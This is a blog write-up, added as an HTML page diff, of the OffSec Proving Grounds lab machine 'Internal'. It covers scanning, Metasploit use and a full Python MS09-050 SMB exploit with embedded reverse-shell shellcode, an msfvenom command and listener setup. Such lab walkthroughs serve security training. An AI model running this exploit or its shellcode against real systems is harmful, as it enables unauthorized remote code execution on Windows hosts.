@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link href="https://fonts.googleapis.com/css?family=Merriweather:300|Raleway:400,700" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/style.css">
+<title>Proving grounds Practice: Internal</title>
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Proving grounds Practice: Internal | Thevillagehacker’s Blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Proving grounds Practice: Internal" />
+<meta name="author" content="Naveen" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Offsec proving grounds practice windows machine writeup" />
+<meta property="og:description" content="Offsec proving grounds practice windows machine writeup" />
+<link rel="canonical" href="http://localhost:4000/2023/08/28/Proving_grounds_Practice-Internal.html" />
+<meta property="og:url" content="http://localhost:4000/2023/08/28/Proving_grounds_Practice-Internal.html" />
+<meta property="og:site_name" content="Thevillagehacker’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-08-28T04:00:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Proving grounds Practice: Internal" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Naveen"},"dateModified":"2023-08-28T04:00:00+05:30","datePublished":"2023-08-28T04:00:00+05:30","description":"Offsec proving grounds practice windows machine writeup","headline":"Proving grounds Practice: Internal","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023/08/28/Proving_grounds_Practice-Internal.html"},"url":"http://localhost:4000/2023/08/28/Proving_grounds_Practice-Internal.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<script type="text/javascript" src="/assets/js/darkmode.js"></script>
+
+</head><body>
+  <main class="container">
+    <section class="about">
+      <div class="about-header condensed">
+      <div class="about-title">
+      <a href="/">
+        
+        <img src="/assets/portfolio.jpg" alt="Naveen Jagadeesan" />
+        
+      </a>
+      <h2 id="title">
+        <a href="/">Naveen Jagadeesan</a>
+      </h2>
+      </div><p class="tagline">Security Analyst. Security Researcher</p></div>
+      
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </section>
+    <section class="content">
+      <div class="post-container">
+  <a class="post-link" href="/2023/08/28/Proving_grounds_Practice-Internal.html">
+    <h2 class="post-title">Proving grounds Practice: Internal</h2>
+  </a>
+  <div class="post-meta">
+    <div class="post-date"><i class="icon-calendar"></i>Aug 28, 2023</div></div>
+  <div class="post">
+    <h2 id="nmap">Nmap</h2>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE    VERSION
+53/tcp    open  tcpwrapped
+135/tcp   open  tcpwrapped
+139/tcp   open  tcpwrapped
+445/tcp   open  tcpwrapped
+3389/tcp  open  tcpwrapped
+5357/tcp  open  tcpwrapped
+49152/tcp open  tcpwrapped
+49153/tcp open  tcpwrapped
+49154/tcp open  tcpwrapped
+49155/tcp open  tcpwrapped
+49156/tcp open  tcpwrapped
+49157/tcp open  tcpwrapped
+49158/tcp open  tcpwrapped
+</code></pre></div></div>
+
+<h2 id="smb-vulnerability-scan">SMB vulnerability scan</h2>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT    STATE SERVICE
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Host script results:
+|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+|_smb-vuln-ms10-054: <span class="nb">false</span>
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability <span class="k">in </span>Microsoft SMBv1 servers <span class="o">(</span>ms17-010<span class="o">)</span>
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk <span class="nb">factor</span>: HIGH
+|       A critical remote code execution vulnerability exists <span class="k">in </span>Microsoft SMBv1
+|        servers <span class="o">(</span>ms17-010<span class="o">)</span><span class="nb">.</span>
+|           
+|     Disclosure <span class="nb">date</span>: 2017-03-14
+|     References:
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2017-0143
+</code></pre></div></div>
+<p><strong>Exploit DB</strong></p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Internal/exploitdb.png" alt="img" /></p>
+
+<h2 id="exploit-using-metasploit">Exploit using metasploit</h2>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole
+use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
+<span class="nb">set </span>RHOSTS &lt;target-ip&gt;
+<span class="nb">set </span>LHOST &lt;local-ip&gt;
+run
+</code></pre></div></div>
+
+<h2 id="exploit-without-metasploit">Exploit without metasploit</h2>
+
+<p><a href="https://www.exploit-db.com/exploits/40280">Microsoft Windows - ‘srv2.sys’ SMB Code Execution (Python) (MS09-050)</a>.</p>
+
+<p><a href="https://raw.githubusercontent.com/ohnozzy/Exploit/master/MS09_050.py">Modified working exploit</a>.</p>
+
+<p><strong>Create reverse shell payload</strong></p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/shell/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.45.153 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-f</span> c
+</code></pre></div></div>
+
+<p>Add the generated shell code as below in the python file.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># EDB-Note: Source ~ https://raw.githubusercontent.com/ohnozzy/Exploit/master/MS09_050.py
+</span>
+<span class="c1">#!/usr/bin/python
+#This module depends on the linux command line program smbclient. 
+#I can't find a python smb library for smb login. If you can find one, you can replace that part of the code with the smb login function in python.
+#The idea is that after the evil payload is injected by the first packet, it need to be trigger by an authentication event. Whether the authentication successes or not does not matter.
+</span><span class="kn">import</span> <span class="n">tempfile</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="kn">import</span> <span class="n">subprocess</span>
+<span class="kn">from</span> <span class="n">socket</span> <span class="kn">import</span> <span class="n">socket</span>
+<span class="kn">from</span> <span class="n">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+<span class="kn">from</span> <span class="n">smb.SMBConnection</span> <span class="kn">import</span> <span class="n">SMBConnection</span>
+
+
+<span class="k">try</span><span class="p">:</span>
+
+    <span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="k">except</span> <span class="nb">IndexError</span><span class="p">:</span>
+    <span class="k">print</span> <span class="sh">'</span><span class="se">\n</span><span class="s">Usage: %s &lt;target ip&gt;</span><span class="se">\n</span><span class="sh">'</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="k">print</span> <span class="sh">'</span><span class="s">Example: MS36299.py 192.168.1.1 1</span><span class="se">\n</span><span class="sh">'</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="c1"># msfvenom -p windows/shell/reverse_tcp LHOST=192.168.45.153 LPORT=4444 EXITFUNC=thread -f c
+# use exploit/multi/handler
+# set payload windows/shell/reverse_tcp
+# set EXITFUNC=thread 
+# config lhost and lport then run
+</span>
+<span class="n">shell</span> <span class="o">=</span> <span class="p">(</span><span class="sh">"</span><span class="se">\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x31\xff\x0f\xb7</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x4a\x26\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x01\xc7\x49\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x8b\x58\x20\x8b</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x48\x18\x50\x01\xd3\x85\xc9\x74\x3c\x49\x31\xff\x8b\x34</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x8b\x01\xd6\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x2d\x99\x68\x02\x00</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xe0\x1d\x2a\x0a\x68</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75</span><span class="sh">"</span>
+<span class="sh">"</span><span class="se">\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="n">target</span><span class="p">,</span> <span class="mi">445</span>
+
+<span class="n">buff</span> <span class="o">=</span><span class="sh">"</span><span class="se">\x00\x00\x03\x9e\xff\x53\x4d\x42</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x72\x00\x00\x00\x00\x18\x53\xc8</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x17\x02</span><span class="sh">"</span> <span class="c1">#high process ID
+</span><span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x00\xe9\x58\x01\x00\x00</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x00\x00\xfe\xda\x00\x7b\x03\x02</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x04\x0d\xdf\xff</span><span class="sh">"</span><span class="o">*</span><span class="mi">25</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x00\x02\x53\x4d</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x42\x20\x32\x2e\x30\x30\x32\x00</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x00\x00\x00\x00</span><span class="sh">"</span><span class="o">*</span><span class="mi">37</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\xff\xff\xff\xff</span><span class="sh">"</span><span class="o">*</span><span class="mi">2</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x42\x42\x42\x42</span><span class="sh">"</span><span class="o">*</span><span class="mi">7</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\xb4\xff\xff\x3f</span><span class="sh">"</span> <span class="c1">#magic index
+</span><span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x41\x41\x41\x41</span><span class="sh">"</span><span class="o">*</span><span class="mi">6</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x09\x0d\xd0\xff</span><span class="sh">"</span> <span class="c1">#return address
+</span>
+<span class="c1">#stager_sysenter_hook from metasploit
+</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\xfc\xfa\xeb\x1e\x5e\x68\x76\x01</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x00\x00\x59\x0f\x32\x89\x46\x5d</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x8b\x7e\x61\x89\xf8\x0f\x30\xb9</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x16\x02\x00\x00\xf3\xa4\xfb\xf4</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\xeb\xfd\xe8\xdd\xff\xff\xff\x6a</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x00\x9c\x60\xe8\x00\x00\x00\x00</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x58\x8b\x58\x54\x89\x5c\x24\x24</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x81\xf9\xde\xc0\xad\xde\x75\x10</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x68\x76\x01\x00\x00\x59\x89\xd8</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x31\xd2\x0f\x30\x31\xc0\xeb\x31</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x8b\x32\x0f\xb6\x1e\x66\x81\xfb</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\xc3\x00\x75\x25\x8b\x58\x5c\x8d</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x5b\x69\x89\x1a\xb8\x01\x00\x00</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x80\x0f\xa2\x81\xe2\x00\x00\x10</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x00\x74\x0e\xba\x00\xff\x3f\xc0</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x83\xc2\x04\x81\x22\xff\xff\xff</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x7f\x61\x9d\xc3\xff\xff\xff\xff</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x00\x04\xdf\xff\x00\x04\xfe\x7f</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x60\x6a\x30\x58\x99\x64\x8b\x18</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x39\x53\x0c\x74\x2b\x8b\x43\x10</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x8b\x40\x3c\x83\xc0\x28\x8b\x08</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x03\x48\x03\x81\xf9\x6c\x61\x73</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x73\x75\x15\xe8\x07\x00\x00\x00</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\xe8\x0d\x00\x00\x00\xeb\x09\xb9</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\xde\xc0\xad\xde\x89\xe2\x0f\x34</span><span class="sh">"</span>
+<span class="n">buff</span><span class="o">+=</span><span class="sh">"</span><span class="se">\x61\xc3\x81\xc4\x54\xf2\xff\xff</span><span class="sh">"</span>
+
+<span class="n">buff</span><span class="o">+=</span><span class="n">shell</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">()</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="n">host</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">buff</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span> 
+<span class="c1">#Trigger the above injected code via authenticated process.
+</span><span class="n">subprocess</span><span class="p">.</span><span class="nf">call</span><span class="p">(</span><span class="sh">"</span><span class="s">echo </span><span class="sh">'</span><span class="s">1223456</span><span class="sh">'</span><span class="s"> | rpcclient -U Administrator %s</span><span class="sh">"</span><span class="o">%</span><span class="p">(</span><span class="n">target</span><span class="p">),</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="troubleshoot-smbsmbconnection">Troubleshoot smb.SMBConnection</h3>
+
+<p>The code is writtent in python2 and there will be an exception due to the <code class="language-plaintext highlighter-rouge">pysmb</code> module not present in the system. In order to resolve the issue follow the below steps:</p>
+
+<ul>
+  <li>Download manually from <a href="https://miketeo.net/blog/projects/pysmb">https://miketeo.net/blog/projects/pysmb</a>.</li>
+  <li>Use unzip to extract and run the <code class="language-plaintext highlighter-rouge">setup.py</code> file using python2.</li>
+  <li>Post that install the dependencies if any is missing in your system based on the exception thrown while running the file.</li>
+  <li>Ensure the dependency packages are being installed using pip2.</li>
+</ul>
+
+<p><strong>Run msfconsole</strong></p>
+
+<p>Run msfconsole and configure the below options.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler
+<span class="nb">set </span>payload windows/shell/reverse_tcp <span class="c">#payload important it should be same as our shellcode payload</span>
+<span class="nb">set </span>EXITFUNC thread
+<span class="nb">set </span>LHOST &lt;IP&gt;
+<span class="nb">set </span>LPORT &lt;PORT&gt;
+run
+</code></pre></div></div>
+
+<p>Run the exploit code along with the target IP and wait for few seconds.</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Internal/shell.png" alt="img" /></p>
+
+<p>Reverse shell obtained.</p>
+
+<p>Thanks for reading!</p>
+
+<p>For more insights and updates, follow me on Twitter: <a href="https://twitter.com/thevillagehackr">@thevillagehacker</a>.</p>
+
+  </div></div>
+
+    </section>
+    <footer class="condensed">
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </footer>
+  </main>
+  
+  <script type="text/javascript" src="/assets/js/darkmode.js"></script>
+  
+  <script src="/assets/js/simple-jekyll-search.min.js"></script>
+  <script src="/assets/js/search.js"></script>
+  
+</body>
+
+</html>
